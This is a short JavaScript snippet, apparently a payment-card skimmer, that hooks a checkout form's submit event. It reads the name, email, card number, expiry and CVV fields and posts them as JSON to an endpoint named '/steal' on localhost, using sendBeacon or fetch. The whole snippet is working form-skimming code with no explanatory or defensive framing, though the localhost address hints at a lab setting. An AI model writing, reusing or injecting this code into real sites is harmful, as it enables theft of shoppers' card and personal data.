(function() {
  const endpoint = 'http://localhost:4000/steal';
  function grab() {
    const data = {
      name: document.getElementById('name')?.value,
      email: document.getElementById('email')?.value,
      card: document.getElementById('cardNumber')?.value,
      exp: document.getElementById('expiry')?.value,
      cvv: document.getElementById('cvv')?.value
    };
    const body = JSON.stringify(data);
    navigator.sendBeacon ? navigator.sendBeacon(endpoint, body) : fetch(endpoint, { method: 'POST', body });
  }
  document.getElementById('checkout-form')?.addEventListener('submit', grab);
})();
